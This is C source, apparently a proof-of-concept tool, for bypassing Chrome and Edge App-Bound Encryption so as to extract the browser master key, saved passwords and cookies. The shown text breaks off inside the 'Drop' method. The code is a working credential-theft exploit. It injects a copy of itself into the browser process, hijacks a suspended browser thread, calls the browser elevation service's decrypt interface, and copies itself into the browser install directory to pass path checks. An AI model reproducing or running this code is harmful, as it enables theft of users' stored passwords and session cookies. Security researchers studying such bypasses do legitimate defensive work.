/*
 * AbeDecrypt: Chromium App-Bound Encryption bypass PoC (4 methods)
 *
 * Usage: AbeDecrypt.exe <Browser> <Method> [-Profile="Profile Name"]
 *   Browser: Chrome | Edge
 *   Method:  Drop | Inject | Hijack | Elevate
 *   Profile: optional profile name, defaults to "Default"
 *   Example: AbeDecrypt.exe Chrome Elevate -Profile="Profile 1"
 *
 * Prints the extracted v10/v20 keys (bright yellow, marked with "!!!"), then
 * 10 cookies and 10 saved passwords, showing encryption version (v10/v20)
 * for each record.
 *
 * Elevate requires admin (impersonates SYSTEM for the SYSTEM DPAPI layer and,
 * for Chrome's V3 envelope, the CNG unwrap of the cng_block).
 * Drop requires admin for system-level browser installs (write to Program Files).
 */

#define MLE_API
#define _USE_COMMCTL60

#include "../../KNSoft.MakeLifeEasier/MakeLifeEasier.h"

#include <stdio.h>
#include <stdlib.h>

#include <bcrypt.h>
#include <dpapi.h>
#include <ncrypt.h>
#include <winsqlite/winsqlite3.h>

#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Ncrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

/*** constants ***/

#define ABE_KEY_SIZE           32
#define ABE_LOCAL_STATE_MAX    (1 << 20)
#define ABE_POLL_COUNT         2000
#define ABE_POLL_SLACK_MS      15

/* V3 private envelope: version[1] + cng_block[32] + nonce[12] + ciphertext[32] + tag[16] */
#define ABE_V3_ENVELOPE_SIZE   93

/* V3 XOR mask, applied to the CNG-decrypted blob; embedded (byte-identical) in the
   Chrome/Edge elevation_service.exe and ChatGPT's importer chrome.dll */
static const BYTE AbeV3Mask[ABE_KEY_SIZE] = {
    0xCC,0xF8,0xA1,0xCE,0xC5,0x66,0x05,0xB8,0x51,0x75,0x52,0xBA,0x1A,0x2D,0x06,0x1C,
    0x03,0xA2,0x9E,0x90,0x27,0x4F,0xB2,0xFC,0xF5,0x9B,0xA4,0xB7,0x5C,0x39,0x23,0x90
};

typedef enum _ABE_METHOD { MethodDrop, MethodInject, MethodHijack, MethodElevate } ABE_METHOD;

typedef struct _ABE_BROWSER
{
    PCWSTR Name;        /* "Chrome" / "Edge" for CLI matching */
    PCWSTR Vendor;      /* dir under LOCALAPPDATA */
    PCWSTR ExeName;
    PCWSTR CngKey;      /* persisted AES key in the SYSTEM profile KSP store (V3) */
    CLSID Clsid;
    IID Iid;
    ULONG DecryptSlot;
} ABE_BROWSER;

static const ABE_BROWSER Browsers[] = {
    { L"Edge",   L"Microsoft\\Edge",  L"msedge.exe", L"Microsoft Edgekey1",
      {0x1FCBE96C,0x1697,0x43AF,{0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67}},
      {0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B}}, 8 },
    { L"Chrome", L"Google\\Chrome",   L"chrome.exe", L"Google Chromekey1",
      {0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}},
      {0x1BF5208B,0x295F,0x4992,{0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38}}, 5 },
};

/*** globals shared with the in-browser payload ***/

#pragma data_seg(".abedata")
__declspec(allocate(".abedata"))
static volatile LONG g_Pending = 0;
__declspec(allocate(".abedata"))
static volatile LONG g_Code = (LONG)0x80004005L;
__declspec(allocate(".abedata"))
static volatile BYTE g_Key[ABE_KEY_SIZE];
#pragma data_seg()

/* request block patched into the mapped image before injection */
#pragma data_seg(".abereq")
__declspec(allocate(".abereq"))
static volatile struct
{
    ULONG BrowserIndex;
    ULONG LocalStateLength;
    BYTE LocalState[ABE_LOCAL_STATE_MAX];
} g_Request = { 0 };
#pragma data_seg()

/*** payload: runs inside the browser process (Hijack initial thread / Inject remote thread) ***/

typedef HRESULT (WINAPI *PFN_DECRYPT_DATA)(PVOID, BSTR, BSTR*, DWORD*);

static VOID
AbePayloadWorker(VOID)
{
    static BYTE Blob[2048];
    const ABE_BROWSER* Browser = NULL;
    HRESULT (WINAPI *CoInit)(PVOID, DWORD);
    HRESULT (WINAPI *CoCreate)(const GUID*, PVOID, DWORD, const GUID*, PVOID*);
    HRESULT (WINAPI *CoBlanket)(PVOID, DWORD, DWORD, PCWSTR, DWORD, DWORD, PVOID, DWORD);
    BSTR (WINAPI *SysAllocByteLen)(PCSTR, UINT);
    UINT (WINAPI *SysByteLen)(BSTR);
    VOID (WINAPI *SysFree)(BSTR);
    BOOL (WINAPI *CryptStrToBin)(PCSTR, DWORD, DWORD, PBYTE, DWORD*, DWORD*, DWORD*);
    PVOID Elevator = NULL;
    BSTR In = NULL, Out = NULL;
    DWORD LastError = 0, Base64Length = 0, BlobLength = sizeof(Blob);
    ULONG Index, TagLength = sizeof("\"app_bound_encrypted_key\":\"") - 1;
    PCSTR Base64 = NULL;
    LONG Code = (LONG)0x80004005L;
    HRESULT Hr = E_FAIL;
    BYTE* Text = (BYTE*)g_Request.LocalState;

    /* runs before CRT init: everything must be resolved dynamically */
    if (g_Request.BrowserIndex < ARRAYSIZE(Browsers))
        Browser = &Browsers[g_Request.BrowserIndex];

    for (Index = 0; Browser && Index + TagLength <= g_Request.LocalStateLength; Index++)
    {
        if (Text[Index] == '"' &&
            memcmp(Text + Index, "\"app_bound_encrypted_key\":\"", TagLength) == 0)
        {
            Base64 = (PCSTR)Text + Index + TagLength;
            break;
        }
    }
    if (Base64)
    {
        while (Base64Length < 8192 && Base64[Base64Length] != '"') Base64Length++;
    }

    CryptStrToBin = (PVOID)GetProcAddress(LoadLibraryW(L"crypt32.dll"),
                                          "CryptStringToBinaryA");
    if (Base64 && CryptStrToBin &&
        CryptStrToBin(Base64, Base64Length, CRYPT_STRING_BASE64,
                      Blob, &BlobLength, NULL, NULL) &&
        BlobLength > 4 && memcmp(Blob, "APPB", 4) == 0 &&
        (CoInit = (PVOID)GetProcAddress(LoadLibraryW(L"ole32.dll"), "CoInitializeEx")) != NULL &&
        (CoCreate = (PVOID)GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoCreateInstance")) != NULL &&
        (CoBlanket = (PVOID)GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoSetProxyBlanket")) != NULL &&
        (SysAllocByteLen = (PVOID)GetProcAddress(LoadLibraryW(L"oleaut32.dll"), "SysAllocStringByteLen")) != NULL &&
        (SysByteLen = (PVOID)GetProcAddress(GetModuleHandleW(L"oleaut32.dll"), "SysStringByteLen")) != NULL &&
        (SysFree = (PVOID)GetProcAddress(GetModuleHandleW(L"oleaut32.dll"), "SysFreeString")) != NULL)
    {
        Hr = CoInit(NULL, COINIT_APARTMENTTHREADED);
        if (SUCCEEDED(Hr))
        {
            Hr = CoCreate(&Browser->Clsid, NULL, CLSCTX_LOCAL_SERVER,
                          &Browser->Iid, &Elevator);
            if (SUCCEEDED(Hr))
            {
                Hr = CoBlanket(Elevator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, NULL,
                               RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
                               NULL, EOAC_DYNAMIC_CLOAKING);
                if (SUCCEEDED(Hr))
                {
                    In = SysAllocByteLen((PCSTR)Blob + 4, BlobLength - 4);
                    Hr = ((PFN_DECRYPT_DATA)((*(PVOID***)Elevator)[Browser->DecryptSlot]))(
                        Elevator, In, &Out, &LastError);
                    if (SUCCEEDED(Hr) && Out && SysByteLen(Out) == ABE_KEY_SIZE)
                    {
                        RtlCopyMemory((PVOID)g_Key, Out, ABE_KEY_SIZE);
                        Code = 0;
                    }
                }
            }
        }
    }
    g_Code = Code != 0 ? (LONG)Hr : 0;
    g_Pending = 1;
}

/* Hijack entry: zero-arg, parks until reaped */
static VOID
AbeHijackEntry(VOID)
{
    AbePayloadWorker();
    for (;;)
    {
        Sleep(INFINITE);
    }
}

/* Inject entry: thread-proc signature, returns so the remote thread can exit */
static DWORD WINAPI
AbeInjectEntry(LPVOID Param)
{
    UNREFERENCED_PARAMETER(Param);
    AbePayloadWorker();
    return 0;
}

/*** CLI parsing ***/

static WCHAR g_Profile[MAX_PATH] = L"Default";

static BOOL
AbeStrIContainsW(
    _In_z_ PCWSTR Haystack,
    _In_z_ PCWSTR Needle)
{
    ULONG i, j;

    for (i = 0; Haystack[i] != UNICODE_NULL; i++)
    {
        for (j = 0; ; j++)
        {
            if (Needle[j] == UNICODE_NULL) return TRUE;
            if (Haystack[i + j] == UNICODE_NULL) return FALSE;
            if (RtlDowncaseUnicodeChar(Haystack[i + j]) !=
                RtlDowncaseUnicodeChar(Needle[j]))
            {
                break;
            }
        }
    }
    return FALSE;
}

static BOOL
AbeStrIStartsWithW(
    _In_z_ PCWSTR Str,
    _In_z_ PCWSTR Prefix)
{
    ULONG i;

    for (i = 0; Prefix[i] != UNICODE_NULL; i++)
    {
        if (Str[i] == UNICODE_NULL ||
            RtlDowncaseUnicodeChar(Str[i]) != RtlDowncaseUnicodeChar(Prefix[i]))
        {
            return FALSE;
        }
    }
    return TRUE;
}

static const ABE_BROWSER*
AbeParseBrowser(VOID)
{
    PCWSTR Cmd = GetCommandLineW();
    ULONG i;

    for (i = 0; Cmd && i < ARRAYSIZE(Browsers); i++)
    {
        if (AbeStrIContainsW(Cmd, Browsers[i].Name)) return &Browsers[i];
    }
    return NULL;
}

static ABE_METHOD
AbeParseMethod(VOID)
{
    PCWSTR Cmd = GetCommandLineW();
    static const struct { PCWSTR Name; ABE_METHOD Id; } Methods[] = {
        { L"Drop",    MethodDrop },
        { L"Inject",  MethodInject },
        { L"Hijack",  MethodHijack },
        { L"Elevate", MethodElevate },
    };
    ULONG i;

    for (i = 0; Cmd && i < ARRAYSIZE(Methods); i++)
    {
        if (AbeStrIContainsW(Cmd, Methods[i].Name)) return Methods[i].Id;
    }
    return MethodHijack;
}

static VOID
AbeParseProfile(VOID)
{
    static const PCWSTR Prefix = L"-Profile=";
    PCWSTR Cmd = GetCommandLineW();
    ULONG i, j;
    PCWSTR Value;
    WCHAR Terminator;

    if (Cmd == NULL) return;
    for (i = 0; ; )
    {
        while (Cmd[i] == L' ') i++;
        if (Cmd[i] == UNICODE_NULL) return;
        /* PowerShell may wrap the whole argument in quotes: "-Profile=Name" */
        j = Cmd[i] == L'"' ? i + 1 : i;
        if (AbeStrIStartsWithW(Cmd + j, Prefix))
        {
            Value = Cmd + j + wcslen(Prefix);
            if (*Value == L'"')
            {
                Value++;
                Terminator = L'"';
            }
            else
            {
                Terminator = Cmd[i] == L'"' ? L'"' : L' ';
            }
            for (j = 0; *Value != UNICODE_NULL && *Value != Terminator && j < MAX_PATH - 1;
                 Value++, j++)
            {
                g_Profile[j] = *Value;
            }
            g_Profile[j] = UNICODE_NULL;
            return;
        }
        /* skip this token (quoted or bare) */
        if (Cmd[i] == L'"')
        {
            for (i++; Cmd[i] != UNICODE_NULL && Cmd[i] != L'"'; i++);
            if (Cmd[i] != UNICODE_NULL) i++;
        }
        else
        {
            while (Cmd[i] != UNICODE_NULL && Cmd[i] != L' ') i++;
        }
    }
}

/*** path & file helpers ***/

static BOOL
AbeGetPaths(
    _In_ const ABE_BROWSER* Browser,
    _Out_writes_(MAX_PATH) PWSTR Exe,
    _Out_writes_(MAX_PATH) PWSTR UserData)
{
    WCHAR Env[MAX_PATH];
    static const PCWSTR Dirs[3] = { L"LOCALAPPDATA", L"ProgramFiles", L"ProgramFiles(x86)" };
    ULONG i;

    for (i = 0; i < 3; i++)
    {
        if (GetEnvironmentVariableW(Dirs[i], Env, MAX_PATH) == 0) continue;
        StrSafe_CchPrintfW(Exe, MAX_PATH, L"%s\\%s\\Application\\%s",
                           Env, Browser->Vendor, Browser->ExeName);
        if (i == 0)
        {
            StrSafe_CchPrintfW(UserData, MAX_PATH, L"%s\\%s\\User Data",
                               Env, Browser->Vendor);
        }
        {
            FILE_NETWORK_OPEN_INFORMATION Attributes;

            if (NT_SUCCESS(IO_GetWin32FileAttributes(Exe, NULL, &Attributes)) &&
                !BooleanFlagOn(Attributes.FileAttributes, FILE_ATTRIBUTE_DIRECTORY))
            {
                return TRUE;
            }
        }
    }
    return FALSE;
}

/* reads the whole file into a Mem_Alloc buffer (caller: Mem_Free) */
static NTSTATUS
AbeReadWholeFile(
    _In_ PCWSTR Path,
    _Outptr_result_bytebuffer_(*Size) PVOID* Buffer,
    _Out_ PULONG Size)
{
    NTSTATUS Status;
    HANDLE File;
    ULONGLONG FileSize;
    PVOID Data;

    *Buffer = NULL;
    *Size = 0;
    Status = IO_OpenWin32File(&File, Path, NULL, FILE_READ_DATA | SYNCHRONIZE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }
    Status = IO_GetFileSize(File, &FileSize);
    if (NT_SUCCESS(Status) && FileSize != 0 && FileSize < ABE_LOCAL_STATE_MAX)
    {
        Data = Mem_Alloc((SIZE_T)FileSize);
        if (Data != NULL)
        {
            Status = IO_ReadFile(File, NULL, Data, (ULONG)FileSize, Size);
            if (NT_SUCCESS(Status))
            {
                *Buffer = Data;
            }
            else
            {
                Mem_Free(Data);
            }
        }
        else
        {
            Status = STATUS_NO_MEMORY;
        }
    }
    else if (NT_SUCCESS(Status))
    {
        Status = STATUS_UNSUCCESSFUL;
    }
    NtClose(File);
    return Status;
}

/* finds a JSON string value in Local State; returns the base64 span inside *Text */
static BOOL
AbeFindJsonTag(
    _In_reads_bytes_(TextLength) const BYTE* Text,
    _In_ ULONG TextLength,
    _In_z_ PCSTR Tag,
    _Out_ PCSTR* Base64,
    _Out_ PDWORD Base64Length)
{
    ULONG TagLength = (ULONG)strlen(Tag);
    ULONG Index;

    for (Index = 0; Index + TagLength <= TextLength; Index++)
    {
        if (Text[Index] == '"' && memcmp(Text + Index, Tag, TagLength) == 0)
        {
            *Base64 = (PCSTR)Text + Index + TagLength;
            *Base64Length = 0;
            while (*Base64Length < 8192 &&
                   (*Base64)[*Base64Length] != '"') (*Base64Length)++;
            return TRUE;
        }
    }
    return FALSE;
}

/* extracts and base64-decodes an "APPB"-prefixed blob from Local State;
   *BlobLength is in/out: capacity in, decoded length out */
static BOOL
AbeReadAppbBlob(
    _In_ const ABE_BROWSER* Browser,
    _Out_writes_bytes_(BlobSize) PBYTE Blob,
    _In_ ULONG BlobSize,
    _Inout_ PDWORD BlobLength)
{
    WCHAR UserData[MAX_PATH], Exe[MAX_PATH], LocalState[MAX_PATH];
    PVOID Text;
    ULONG TextLength;
    PCSTR Base64;
    DWORD Base64Length;
    BOOL Ok;

    if (!AbeGetPaths(Browser, Exe, UserData)) return FALSE;
    StrSafe_CchPrintfW(LocalState, MAX_PATH, L"%s\\Local State", UserData);
    if (!NT_SUCCESS(AbeReadWholeFile(LocalState, &Text, &TextLength))) return FALSE;
    Ok = AbeFindJsonTag(Text, TextLength, "\"app_bound_encrypted_key\":\"",
                        &Base64, &Base64Length) &&
         CryptStringToBinaryA(Base64, Base64Length, CRYPT_STRING_BASE64,
                              Blob, BlobLength, NULL, NULL) &&
         *BlobLength > 4 && memcmp(Blob, "APPB", 4) == 0;
    Mem_Free(Text);
    return Ok;
}

/*** self-map: stage a relocated copy of our image into the target ***/

static BOOL
AbeMapSelf(
    _In_ HANDLE Process,
    _Out_ PVOID* Mapped)
{
    PBYTE Self = (PBYTE)GetModuleHandleW(NULL);
    IMAGE_NT_HEADERS* Nt = RtlImageNtHeader((PVOID)Self);
    IMAGE_BASE_RELOCATION* Reloc;
    PUSHORT Entry;
    PBYTE Copy = NULL;
    PVOID Remote = NULL;
    SIZE_T Size, Count, i, RegionSize;
    ULONG64 Delta;
    ULONG Remaining, BlockSize;
    BOOL Ok = FALSE;

    *Mapped = NULL;
    if (Nt == NULL) return FALSE;
    Size = Nt->OptionalHeader.SizeOfImage;
    RegionSize = Size;
    if (!NT_SUCCESS(NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&Copy, 0,
                                            &RegionSize, MEM_COMMIT | MEM_RESERVE,
                                            PAGE_READWRITE)) ||
        !NT_SUCCESS(NtAllocateVirtualMemory(Process, &Remote, 0, &RegionSize,
                                            MEM_COMMIT | MEM_RESERVE,
                                            PAGE_EXECUTE_READWRITE)))
    {
        goto Cleanup;
    }

    RtlCopyMemory(Copy, Self, Size);
    Delta = (ULONG64)(ULONG_PTR)Remote - (ULONG64)(ULONG_PTR)Self;
    if (Delta != 0)
    {
        Reloc = (IMAGE_BASE_RELOCATION*)(Copy +
            Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        Remaining = Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        while (Remaining >= sizeof(*Reloc))
        {
            BlockSize = Reloc->SizeOfBlock;
            Count = (BlockSize - sizeof(*Reloc)) / sizeof(USHORT);
            Entry = (PUSHORT)(Reloc + 1);
            for (i = 0; i < Count; i++)
            {
                if ((Entry[i] >> 12) == IMAGE_REL_BASED_DIR64)
                {
                    *(ULONG64*)(Copy + Reloc->VirtualAddress + (Entry[i] & 0xFFF)) += Delta;
                }
            }
            Remaining -= BlockSize;
            Reloc = (IMAGE_BASE_RELOCATION*)((PBYTE)Reloc + BlockSize);
        }
    }
    if (!NT_SUCCESS(NtWriteVirtualMemory(Process, Remote, Copy, Size, NULL)))
    {
        goto Cleanup;
    }
    NtFlushInstructionCache(Process, Remote, Size);
    *Mapped = Remote;
    Ok = TRUE;

Cleanup:
    if (Copy != NULL) NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&Copy, &RegionSize, MEM_RELEASE);
    if (!Ok && Remote != NULL)
    {
        RegionSize = 0;
        NtFreeVirtualMemory(Process, &Remote, &RegionSize, MEM_RELEASE);
    }
    return Ok;
}

/* polls g_Pending in the mapped copy, then copies out g_Code/g_Key */
static LONG
AbeWaitRemoteResult(
    _In_ HANDLE Process,
    _In_opt_ HANDLE WaitObject,
    _In_ PVOID Mapped,
    _In_ PVOID SelfBase,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    LONG Pending = 0, Code = (LONG)0x80004005L;
    LARGE_INTEGER Timeout;
    ULONG Polls;

    Timeout.QuadPart = -(LONGLONG)ABE_POLL_SLACK_MS * 10000;
    for (Polls = 0; Polls < ABE_POLL_COUNT; Polls++)
    {
        if (NT_SUCCESS(NtReadVirtualMemory(Process,
                                           (PBYTE)Mapped + ((ULONG64)(ULONG_PTR)&g_Pending - (ULONG64)(ULONG_PTR)SelfBase),
                                           &Pending, sizeof(Pending), NULL)) && Pending != 0)
        {
            break;
        }
        if (WaitObject != NULL &&
            NtWaitForSingleObject(WaitObject, FALSE, &Timeout) == STATUS_WAIT_0)
        {
            break;
        }
    }
    NtReadVirtualMemory(Process,
                        (PBYTE)Mapped + ((ULONG64)(ULONG_PTR)&g_Code - (ULONG64)(ULONG_PTR)SelfBase),
                        &Code, sizeof(Code), NULL);
    if (Code == 0)
    {
        NtReadVirtualMemory(Process,
                            (PBYTE)Mapped + ((ULONG64)(ULONG_PTR)g_Key - (ULONG64)(ULONG_PTR)SelfBase),
                            Key, ABE_KEY_SIZE, NULL);
    }
    return Code;
}

static BOOL
AbePrepareRequest(
    _In_ const ABE_BROWSER* Browser,
    _In_ ULONG BrowserIndex)
{
    WCHAR Exe[MAX_PATH], UserData[MAX_PATH], LocalState[MAX_PATH];
    PVOID Text;
    ULONG TextLength;
    BOOL Ok = FALSE;

    if (!AbeGetPaths(Browser, Exe, UserData)) return FALSE;
    StrSafe_CchPrintfW(LocalState, MAX_PATH, L"%s\\Local State", UserData);
    if (NT_SUCCESS(AbeReadWholeFile(LocalState, &Text, &TextLength)) &&
        TextLength < ABE_LOCAL_STATE_MAX)
    {
        RtlCopyMemory((PVOID)g_Request.LocalState, Text, TextLength);
        g_Request.BrowserIndex = BrowserIndex;
        g_Request.LocalStateLength = TextLength;
        Ok = TRUE;
    }
    Mem_Free(Text); /* Mem_Free(NULL) is fine */
    return Ok;
}

/*** method: Hijack (suspended browser initial thread redirected to our payload) ***/

static BOOL
AbeGetKeyHijack(
    _In_ const ABE_BROWSER* Browser,
    _In_ ULONG BrowserIndex,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    PVOID Self = GetModuleHandleW(NULL);
    STARTUPINFOW Si;
    PROCESS_INFORMATION Pi;
    CONTEXT Ctx = { 0 };
    PVOID Mapped = NULL;
    WCHAR Exe[MAX_PATH], UserData[MAX_PATH];
    LONG Code = (LONG)0x80004005L;

    if (!AbePrepareRequest(Browser, BrowserIndex)) return FALSE;
    if (!AbeGetPaths(Browser, Exe, UserData)) return FALSE;

    ZeroMemory(&Si, sizeof(Si));
    ZeroMemory(&Pi, sizeof(Pi));
    Si.cb = sizeof(Si);
    if (!CreateProcessW(Exe, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &Si, &Pi))
    {
        printf("L%-3lu: Hijack: CreateProcess failed, gle=%lu\n", __LINE__, GetLastError());
        return FALSE;
    }

    if (AbeMapSelf(Pi.hProcess, &Mapped))
    {
        Ctx.ContextFlags = CONTEXT_CONTROL;
        if (NT_SUCCESS(NtGetContextThread(Pi.hThread, &Ctx)))
        {
            Ctx.CONTEXT_PC = (DWORD64)(ULONG_PTR)Mapped +
                      ((ULONG64)(ULONG_PTR)AbeHijackEntry - (ULONG64)(ULONG_PTR)Self);
            if (NT_SUCCESS(NtSetContextThread(Pi.hThread, &Ctx)))
            {
                NtResumeThread(Pi.hThread, NULL);
                Code = AbeWaitRemoteResult(Pi.hProcess, Pi.hProcess, Mapped, Self, Key);
            }
        }
    }
    if (Code != 0)
    {
        printf("L%-3lu: Hijack: payload hr=0x%08lX\n", __LINE__, (unsigned long)Code);
    }

    NtTerminateProcess(Pi.hProcess, 0);
    NtWaitForSingleObject(Pi.hProcess, FALSE, NULL);
    NtClose(Pi.hThread);
    NtClose(Pi.hProcess);
    return Code == 0;
}

/*** method: Inject (target the running browser process) ***/

static ULONG
AbeFindProcessIdByName(
    _In_z_ PCWSTR Name)
{
    UNICODE_STRING Target;
    PSYSTEM_PROCESS_INFORMATION Process, Entry;
    ULONG Length = 0x400000, Pid = 0;
    NTSTATUS Status;

    RtlInitUnicodeString(&Target, Name);
    Process = NULL;
    for (;;)
    {
        Process = Mem_ReAlloc(Process, Length);
        if (Process == NULL) return 0;
        Status = NtQuerySystemInformation(SystemProcessInformation, Process, Length, &Length);
        if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_OVERFLOW &&
            Status != STATUS_BUFFER_TOO_SMALL)
        {
            break;
        }
        if (Length > 64 * 1024 * 1024)
        {
            Mem_Free(Process);
            return 0;
        }
        Length *= 2;
    }
    if (NT_SUCCESS(Status))
    {
        Entry = Process;
        for (;;)
        {
            if (Entry->ImageName.Buffer != NULL &&
                RtlEqualUnicodeString(&Entry->ImageName, &Target, TRUE))
            {
                Pid = (ULONG)(ULONG_PTR)Entry->UniqueProcessId;
                break;
            }
            if (Entry->NextEntryOffset == 0) break;
            Entry = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)Entry + Entry->NextEntryOffset);
        }
    }
    Mem_Free(Process);
    return Pid;
}

static BOOL
AbeGetKeyInject(
    _In_ const ABE_BROWSER* Browser,
    _In_ ULONG BrowserIndex,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    PVOID Self = GetModuleHandleW(NULL);
    PVOID Mapped = NULL;
    HANDLE Process = NULL, Thread = NULL;
    SIZE_T RegionSize = 0;
    LONG Code = (LONG)0x80004005L;
    ULONG Pid, Polls;
    NTSTATUS Status;

    if (!AbePrepareRequest(Browser, BrowserIndex)) return FALSE;

    Pid = AbeFindProcessIdByName(Browser->ExeName);
    if (Pid == 0)
    {
        /* not running: launch it so we have a live process to inject into */
        WCHAR Exe[MAX_PATH], UserData[MAX_PATH];
        STARTUPINFOW Si;
        PROCESS_INFORMATION Pi;

        if (!AbeGetPaths(Browser, Exe, UserData)) return FALSE;
        ZeroMemory(&Si, sizeof(Si));
        ZeroMemory(&Pi, sizeof(Pi));
        Si.cb = sizeof(Si);
        if (!CreateProcessW(Exe, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &Si, &Pi))
        {
            printf("L%-3lu: Inject: CreateProcess(%ls) failed, gle=%lu\n",
                            __LINE__, Browser->ExeName, GetLastError());
            return FALSE;
        }
        NtClose(Pi.hThread);
        NtClose(Pi.hProcess);
        for (Polls = 0; Polls < 50; Polls++)
        {
            Pid = AbeFindProcessIdByName(Browser->ExeName);
            if (Pid != 0) break;
            Sleep(200);
        }
        printf("Inject: launched %ls (pid=%lu)\n", Browser->ExeName, Pid);
    }
    if (Pid == 0)
    {
        printf("L%-3lu: Inject: no running %ls process\n", __LINE__, Browser->ExeName);
        return FALSE;
    }
    Status = PS_OpenProcess(&Process, PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                            PROCESS_VM_READ, Pid);
    if (!NT_SUCCESS(Status))
    {
        printf("L%-3lu: Inject: OpenProcess(%lu) failed, 0x%08lX\n",
                        __LINE__, Pid, Status);
        return FALSE;
    }

    if (AbeMapSelf(Process, &Mapped) &&
        NT_SUCCESS(PS_CreateThread(Process, FALSE,
                                   (PUSER_THREAD_START_ROUTINE)((PBYTE)Mapped +
                                       ((ULONG64)(ULONG_PTR)AbeInjectEntry - (ULONG64)(ULONG_PTR)Self)),
                                   NULL, &Thread, NULL)))
    {
        Code = AbeWaitRemoteResult(Process, Thread, Mapped, Self, Key);
    }
    if (Code != 0)
    {
        printf("L%-3lu: Inject: payload hr=0x%08lX\n", __LINE__, (unsigned long)Code);
    }

    /* do NOT terminate the user's browser; the remote thread exits on its own */
    if (Thread != NULL) NtClose(Thread);
    if (Mapped != NULL) NtFreeVirtualMemory(Process, &Mapped, &RegionSize, MEM_RELEASE);
    NtClose(Process);
    return Code == 0;
}

/*** method: Drop (copy self into the browser dir so COM path validation passes) ***/

static BOOL
AbeGetKeyDrop(
    _In_ const ABE_BROWSER* Browser,
    _In_ ULONG BrowserIndex,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    WCHAR Self[MAX_PATH], Copy[MAX_PATH], Cmd[MAX_PATH * 2], Exe[MAX_PATH], UserData[MAX_PATH];
    SECURITY_ATTRIBUTES Sa;
    STARTUPINFOW Si;
    PROCESS_INFORMATION Pi;
    HANDLE ReadPipe = NULL, WritePipe = NULL;
    static CHAR Buffer[4096];
    CHAR* Line;
    DWORD Read, Total = 0;
    ULONG i;

    if (!AbeGetPaths(Browser, Exe, UserData)) return FALSE;

    /* if we're already in the browser directory, run the COM path directly */
    GetModuleFileNameW(NULL, Self, MAX_PATH);
    if (AbeStrIContainsW(Self, Browser->Vendor))
    {
        /* child: do COM directly and print the key for the parent */
        RtlZeroMemory((PVOID)g_Key, ABE_KEY_SIZE);
        g_Pending = 0;
        g_Code = (LONG)0x80004005L;
        if (!AbePrepareRequest(Browser, BrowserIndex)) return FALSE;
        AbePayloadWorker();
        if (g_Code == 0)
        {
            printf("KEY=");
            for (i = 0; i < ABE_KEY_SIZE; i++) printf("%02X", g_Key[i]);
            printf("\n");
            return TRUE;
        }
        return FALSE;
    }

    /* parent: copy self into the browser dir and run the child */
    {
        PWSTR Slash = wcsrchr(Exe, L'\\');

        if (Slash == NULL) return FALSE;
        *Slash = UNICODE_NULL;
        StrSafe_CchPrintfW(Copy, MAX_PATH, L"%s\\abe_helper.exe", Exe);
    }
    if (!CopyFileW(Self, Copy, FALSE))
    {
        printf("L%-3lu: Drop: copy to browser dir failed, gle=%lu (admin needed?)\n",
                        __LINE__, GetLastError());
        return FALSE;
    }

    Sa.nLength = sizeof(Sa);
    Sa.bInheritHandle = TRUE;
    Sa.lpSecurityDescriptor = NULL;
    CreatePipe(&ReadPipe, &WritePipe, &Sa, 0);
    SetHandleInformation(ReadPipe, HANDLE_FLAG_INHERIT, 0);

    ZeroMemory(&Si, sizeof(Si));
    Si.cb = sizeof(Si);
    Si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    Si.wShowWindow = SW_HIDE;
    Si.hStdOutput = WritePipe;
    Si.hStdError = WritePipe;
    StrSafe_CchPrintfW(Cmd, MAX_PATH * 2,
                       L"\"%s\" %s Drop", Copy, Browser->Name);
    if (!CreateProcessW(NULL, Cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &Si, &Pi))
    {
        printf("L%-3lu: Drop: spawn child failed, gle=%lu\n", __LINE__, GetLastError());
        CloseHandle(ReadPipe);
        CloseHandle(WritePipe);
        DeleteFileW(Copy);
        return FALSE;
    }
    CloseHandle(WritePipe);
    NtWaitForSingleObject(Pi.hProcess, FALSE, NULL);

    while (Total < sizeof(Buffer) - 1 &&
           ReadFile(ReadPipe, Buffer + Total, (DWORD)(sizeof(Buffer) - 1 - Total), &Read, NULL) &&
           Read != 0)
    {
        Total += Read;
    }
    CloseHandle(ReadPipe);
    NtClose(Pi.hThread);
    NtClose(Pi.hProcess);
    for (i = 0; i < 4 && !DeleteFileW(Copy); i++) Sleep(200);

    /* locate "KEY=" byte-wise: the unit-test framework's Print() embeds NUL
       terminators in the stream, so strstr() stops at the banner already */
    for (i = 0; i + 4 + ABE_KEY_SIZE * 2 <= Total; i++)
    {
        if (Buffer[i] == 'K' && Buffer[i + 1] == 'E' &&
            Buffer[i + 2] == 'Y' && Buffer[i + 3] == '=')
        {
            break;
        }
    }
